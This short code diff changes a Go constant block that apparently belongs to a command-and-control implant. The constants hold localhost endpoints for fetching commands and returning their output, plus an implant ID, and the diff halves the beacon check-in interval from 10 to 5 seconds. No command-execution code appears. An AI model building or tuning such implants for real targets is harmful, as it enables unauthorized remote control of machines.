@@ -15,7 +15,7 @@ const (
 	commandsURL      = "http://localhost:8080/implants/%s/commands" // Endpoint to fetch pending commands
 	commandResultURL = "http://localhost:8080/command-result" // Endpoint to send command output
 	implantID        = "202f0a52-9fb3-438b-81a7-640f2d2b24ef"    // Unique ID of the implant
-	checkInInterval  = 10 * time.Second                          // Interval for checking in with the C2 server
+	checkInInterval  = 5 * time.Second                          // Interval for checking in with the C2 server
 )
 
 // Command represents a command from the C2 server
